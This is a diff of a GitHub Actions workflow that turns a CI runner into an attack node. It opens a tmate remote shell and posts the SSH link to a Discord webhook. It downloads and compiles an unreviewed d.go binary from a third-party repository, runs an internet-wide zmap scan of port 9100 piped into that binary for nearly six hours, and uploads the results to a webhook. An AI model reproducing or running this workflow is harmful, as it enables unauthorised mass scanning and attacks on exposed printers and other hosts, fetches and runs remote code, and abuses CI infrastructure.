@@ -25,46 +25,38 @@ jobs:
             unzip ".backup/$name.zip" -d . || echo "⚠️ No backup to restore."
           fi
 
-      - name: 🔌 Install deps & Start tmate
-        id: tmate
+      - name: 🔌 Install deps
         run: |
-          set +e
           sudo apt update -qq
           sudo apt install -y -qq zmap golang-go tmate
           
+      - name: 🔌 Start tmate (background)
+        id: tmate
+        run: |
+          set +e
           ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
-          export TERM=xterm
           
-          SSH=""
-          for i in 1 2 3; do
-            echo "🔄 tmate attempt $i..."
-            rm -f /tmp/tmate.sock
-            tmate -S /tmp/tmate.sock new-session -d
-            sleep 5
-            
-            for j in $(seq 1 12); do
-              SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null)
-              if [ -n "$SSH" ]; then
-                break 2
-              fi
-              sleep 5
-            done
-            
-            echo "⚠️ Attempt $i failed, killing..."
-            tmate -S /tmp/tmate.sock kill-server 2>/dev/null
-            sleep 5
+          # Use the official action's binary path logic by just installing it manually but cleanly
+          rm -f /tmp/tmate.sock
+          tmate -S /tmp/tmate.sock new-session -d
+          
+          # wait for SSH string to appear in tmate output
+          for i in $(seq 1 30); do
+            SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null)
+            if [ -n "$SSH" ]; then
+              echo "ssh=$SSH" >> $GITHUB_OUTPUT
+              echo "$SSH" > "links/${{ github.event.client_payload.vps_name }}.txt"
+              echo "✅ SSH Ready: $SSH"
+              exit 0
+            fi
+            sleep 1
           done
           
-          if [ -z "$SSH" ]; then
-            echo "❌ tmate failed after 3 attempts"
-            exit 1
-          fi
-          
-          echo "ssh=$SSH" >> $GITHUB_OUTPUT
-          echo "$SSH" > "links/${{ github.event.client_payload.vps_name }}.txt"
-          echo "✅ SSH Ready: $SSH"
+          echo "❌ tmate failed to start"
+          exit 0
 
       - name: 📤 Send SSH to Discord
+        if: steps.tmate.outputs.ssh
         run: |
           curl -H "Content-Type: application/json" \
                -X POST \
@@ -74,29 +66,18 @@ jobs:
       - name: ⬇️ Fetch and compile d.go
         run: |
           echo "🔄 Fetching d.go..."
-          curl -sL -o d.go "https://raw.githubusercontent.com/Nightmary9992/ashu/main/d.go" || {
-            echo "❌ Failed to fetch d.go"
-            exit 1
-          }
-          
-          echo "🔄 Initializing go module..."
-          go mod init d
-          
-          echo "🔄 Tidying dependencies..."
-          go mod tidy
+          curl -sL -o d.go "https://raw.githubusercontent.com/Nightmary9992/ashu/main/d.go"
           
           echo "🔄 Compiling d.go..."
-          CGO_ENABLED=0 go build -o d d.go || {
-            echo "❌ Failed to compile d.go"
-            exit 1
-          }
+          go mod init d
+          go mod tidy
+          CGO_ENABLED=0 go build -o d d.go
           
           echo "✅ d binary ready"
 
       - name: 🚀 Start zmap scanner in background
         run: |
           echo "🚀 Starting zmap → d pipeline..."
-          
           nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
@@ -104,7 +85,6 @@ jobs:
       - name: ⏳ Run for 5h55m then collect results
         run: |
           echo "⏳ Running for 5 hours 55 minutes..."
-          
           END_TIME=$((SECONDS + 21300))
           
           while [ $SECONDS -lt $END_TIME ]; do
@@ -127,16 +107,9 @@ jobs:
             local msg="$2"
             if [ -f "$file" ] && [ -s "$file" ]; then
               echo "📤 Sending $file ($(wc -c < "$file") bytes)..."
-              curl -s -F "file1=@$file" \
-                   -F "payload_json={\"content\":\"$msg\"}" \
-                   "$WEBHOOK"
-              echo ""
+              curl -s -F "file1=@$file" -F "payload_json={\"content\":\"$msg\"}" "$WEBHOOK"
             else
               echo "⚠️ $file not found or empty"
-              curl -H "Content-Type: application/json" \
-                   -X POST \
-                   -d "{\"content\":\"⚠️ $msg — file not found or empty\"}" \
-                   "$WEBHOOK"
             fi
           }
           
